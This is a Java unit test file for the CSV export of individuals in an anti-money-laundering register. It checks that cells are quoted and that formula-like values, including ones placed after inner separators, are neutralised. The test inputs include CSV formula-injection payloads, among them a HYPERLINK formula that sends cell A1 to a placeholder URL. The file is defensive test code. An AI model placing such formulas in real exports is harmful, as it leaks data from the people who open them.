package nz.amldock.individual;

import nz.amldock.ownership.NodeType;
import nz.amldock.ownership.NodeVerificationStatus;
import org.junit.jupiter.api.Test;

import java.time.Instant;
import java.time.LocalDate;
import java.util.Set;

import static org.assertj.core.api.Assertions.assertThat;

/** The server-built register export reads the same as the one the browser used to build. */
class IndividualCsvTest {

    @Test
    void everyFieldIsQuotedWithInnerQuotesDoubled() {
        // Quoting every cell (F10) means no separator inside a value can split it, whichever
        // separator the reader's spreadsheet uses.
        assertThat(IndividualCsv.escape("plain")).isEqualTo("\"plain\"");
        assertThat(IndividualCsv.escape("12 Queen St, Auckland")).isEqualTo("\"12 Queen St, Auckland\"");
        assertThat(IndividualCsv.escape("The \"Smith\" Trust")).isEqualTo("\"The \"\"Smith\"\" Trust\"");
        assertThat(IndividualCsv.escape("line\nbreak")).isEqualTo("\"line\nbreak\"");
        assertThat(IndividualCsv.escape(null)).isEqualTo("\"\"");
    }

    @Test
    void aFieldThatWouldOpenAsAFormulaOpensAsText() {
        // C-14. A typed name or address starting like a formula ran as one in the spreadsheet of
        // whoever opened the export.
        assertThat(IndividualCsv.escape("=1+1")).isEqualTo("\"'=1+1\"");
        assertThat(IndividualCsv.escape("+64 21 555 0100")).isEqualTo("\"'+64 21 555 0100\"");
        assertThat(IndividualCsv.escape("-1")).isEqualTo("\"'-1\"");
        assertThat(IndividualCsv.escape("@SUM(A1)")).isEqualTo("\"'@SUM(A1)\"");
        // Leading whitespace doesn't hide it.
        assertThat(IndividualCsv.escape(" =1+1")).isEqualTo("\"' =1+1\"");
        assertThat(IndividualCsv.escape("=HYPERLINK(\"x\",\"y\")"))
                .isEqualTo("\"'=HYPERLINK(\"\"x\"\",\"\"y\"\")\"");
    }

    /**
     * F10. A spreadsheet set to split on ';' read "x;=HYPERLINK(...)" as two cells, the second a
     * live formula, because only the first character was checked and ';' didn't trigger quoting.
     */
    @Test
    void aFormulaAfterAnySeparatorInsideTheValueIsNeutralised() {
        assertThat(IndividualCsv.escape("x;=HYPERLINK(\"http://e/?\"&A1)"))
                .isEqualTo("\"x;'=HYPERLINK(\"\"http://e/?\"\"&A1)\"");
        assertThat(IndividualCsv.escape("a,+1")).isEqualTo("\"a,'+1\"");
        assertThat(IndividualCsv.escape("a\t-1")).isEqualTo("\"a\t'-1\"");
        assertThat(IndividualCsv.escape("a|@x")).isEqualTo("\"a|'@x\"");
        assertThat(IndividualCsv.escape("a\n=1")).isEqualTo("\"a\n'=1\"");
        assertThat(IndividualCsv.escape("a; =1")).isEqualTo("\"a; '=1\"");
        assertThat(IndividualCsv.escape("\t=1")).isEqualTo("\"'\t'=1\"");
    }

    @Test
    void ordinaryTextIsLeftAlone() {
        // The characters only matter after a separator or at the start.
        assertThat(IndividualCsv.escape("Smith-Jones")).isEqualTo("\"Smith-Jones\"");
        assertThat(IndividualCsv.escape("a=b")).isEqualTo("\"a=b\"");
        assertThat(IndividualCsv.escape("mei@example.com")).isEqualTo("\"mei@example.com\"");
        assertThat(IndividualCsv.escape("Flat 2, 10 Main St")).isEqualTo("\"Flat 2, 10 Main St\"");
    }

    @Test
    void typeLabelsMatchTheFrontend() {
        assertThat(IndividualCsv.typeLabel(NodeType.INDIVIDUAL)).isEqualTo("Individual");
        assertThat(IndividualCsv.typeLabel(NodeType.PRIVATE_COMPANY)).isEqualTo("Private company");
        assertThat(IndividualCsv.typeLabel(NodeType.OTHER)).isEqualTo("Other entity");
    }

    @Test
    void registerRowSpellsOutTheCountry() {
        IndividualRowDto r = row("NZ", null);
        assertThat(IndividualCsv.registerRow(r))
                .isEqualTo("\"Mei Chen\",\"Individual\",\"1980-02-01\",\"New Zealand\",\"1 Queen St, Auckland\",\"D-1\"");
    }

    @Test
    void anUnrecordedCountryIsBlankAndAnUnknownCodeStaysACode() {
        assertThat(IndividualCsv.countryName(null)).isEmpty();
        assertThat(IndividualCsv.countryName("ZZ")).isEqualTo("ZZ");
    }

    @Test
    void exceptionRowIsDatedByVerification() {
        IndividualRowDto r = row("NZ", Instant.parse("2026-09-01T10:00:00Z"));
        assertThat(IndividualCsv.exceptionRow(r))
                .isEqualTo("\"Mei Chen\",\"Individual\",\"2026-09-01T10:00:00Z\",\"1 Queen St, Auckland\",\"D-1\"");
    }

    private static IndividualRowDto row(String country, Instant verifiedAt) {
        return new IndividualRowDto(1L, NodeType.INDIVIDUAL, 2L, "D-1", "1 Queen St, Auckland", "Mei Chen",
                LocalDate.of(1980, 2, 1), country, Set.of(), NodeVerificationStatus.VERIFIED_WITH_EXCEPTION,
                verifiedAt);
    }
}
